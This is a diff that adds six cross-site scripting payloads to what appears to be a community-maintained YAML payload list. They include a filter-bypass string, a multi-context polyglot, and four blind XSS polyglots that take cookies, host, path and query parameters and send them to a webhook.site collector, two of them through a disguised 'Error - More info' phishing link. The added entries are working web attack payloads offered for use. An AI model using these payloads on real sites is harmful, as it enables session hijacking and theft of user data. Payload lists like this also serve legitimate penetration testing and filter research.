@@ -11259,4 +11259,77 @@ payloads:
     browsers: ["All"]
     date_added: "08-03-2026"
 
+  # ============================================
+  # Advanced Polyglot & Blind XSS Payloads
+  # ============================================
+
+  - code: |
+      JavaScript://%250Aalert?.(1)//
+    description: "JavaScript protocol bypass using double URL-encoded newline (%250A) and optional chaining operator (?.)"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["javascript-protocol", "url-encoding", "optional-chaining", "bypass", "filter-evasion"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
+  - code: |
+      '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+      </Title/</Style/</Script/</textArea/</iFrame/</noScript>
+      \74k<K/contentEditable/autoFocus/OnFocus=
+      /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+    description: "Advanced multi-context polyglot - breaks out of JS strings, comments, and HTML tags using contentEditable/autoFocus/OnFocus for execution"
+    category: "polyglot"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["polyglot", "multi-context", "string-breakout", "contenteditable", "autofocus", "onfocus"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
+  - code: |
+      //*'/*\'/*"/*\"/*\`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript><script>var x%3Dnew XMLHttpRequest();l%3Dwindow.location;x.open('POST','https://webhook.site/*webhook_id*');x.setRequestHeader('Content-type','application/x-www-form-urlencoded');x.send('i%3D*uuid*%26h%3D'%2Bl.host%2B'%26p%3D'%2Bl.pathname%2B'%26s%3D'%2Bl.search%2B'%26c%3D'%2Bdocument.cookie);</script>
+    description: "Blind XSS polyglot with XMLHttpRequest POST exfiltration (URL-encoded) - sends host, path, search params and cookies to webhook"
+    category: "blind"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["blind-xss", "polyglot", "xhr", "post", "exfiltration", "url-encoded", "webhook"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
+  - code: |
+      //*'/*\'/*"/*\"/*`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript><a id%3D"a">Error - More info</a><script>l%3Dwindow.location;d%3Ddocument;d.getElementById("a").href%3D"https://webhook.site/*webhook_id*?i%3D*uuid*%26h%3D"%2Bl.host%2B"%26s%3D"%2Bl.search%2B"%26c%3D"%2Bd.cookie;</script>
+    description: "Blind XSS polyglot with clickable link exfiltration (URL-encoded) - creates phishing link that sends data on click"
+    category: "blind"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["blind-xss", "polyglot", "phishing-link", "exfiltration", "url-encoded", "social-engineering"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
+  - code: |
+      //*'/*\'/*"/*\"/*`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript><script>var x=new XMLHttpRequest();l=window.location;x.open('POST','https://webhook.site/*webhook_id*');x.setRequestHeader('Content-type','application/x-www-form-urlencoded');x.send('i=*uuid*&h='+l.host+'&p='+l.pathname+'&s='+l.search+'&c='+document.cookie);</script>
+    description: "Blind XSS polyglot with XMLHttpRequest POST exfiltration (clean) - sends host, path, search params and cookies to webhook"
+    category: "blind"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["blind-xss", "polyglot", "xhr", "post", "exfiltration", "webhook"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
+  - code: |
+      //*'/*\'/*"/*\"/*`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript><a id="a">Error - More info</a><script>l=window.location;d=document;d.getElementById("a").href="https://webhook.site/*webhook_id*?i=*uuid*&h="+l.host+"&s="+l.search+"&c="+d.cookie;</script>
+    description: "Blind XSS polyglot with clickable link exfiltration (clean) - creates phishing link that sends data on click"
+    category: "blind"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["blind-xss", "polyglot", "phishing-link", "exfiltration", "social-engineering"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "14-04-2026"
+
 
